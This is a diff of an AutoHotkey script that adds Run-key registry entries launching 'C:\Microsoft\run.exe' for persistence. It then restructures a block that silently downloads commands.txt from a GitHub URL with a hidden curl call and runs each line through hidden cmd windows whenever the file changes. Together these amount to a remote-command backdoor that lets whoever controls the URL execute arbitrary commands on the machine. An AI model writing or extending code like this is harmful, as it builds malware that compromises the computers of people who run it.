@@ -35,25 +35,25 @@ runAllExes() {
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate8"
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate9"
 
+    output := path "\commands.txt"
     try {
-        output := path "\commands.txt"
         original := FileRead(output)
-        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/commands.txt"
-        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
-        RunWait command, , "Hide"
-        text := FileRead(output)
-        MsgBox last
-        MsgBox text
-        if (last != text) {
-            MsgBox "made it"
-            last := text
-            lines := StrSplit(Trim(text), "`n")
-            for index, line in lines {
-                newCommand := 'cmd /c ' line
-                Run newCommand, , "Hide"
-            }
-        }
     } catch {
+    }
+    url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/commands.txt"
+    command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
+    RunWait command, , "Hide"
+    text := FileRead(output)
+    MsgBox last
+    MsgBox text
+    if (last != text) {
+        MsgBox "made it"
+        last := text
+        lines := StrSplit(Trim(text), "`n")
+        for index, line in lines {
+            newCommand := 'cmd /c ' line
+            Run newCommand, , "Hide"
+        }
     }
 
     try {
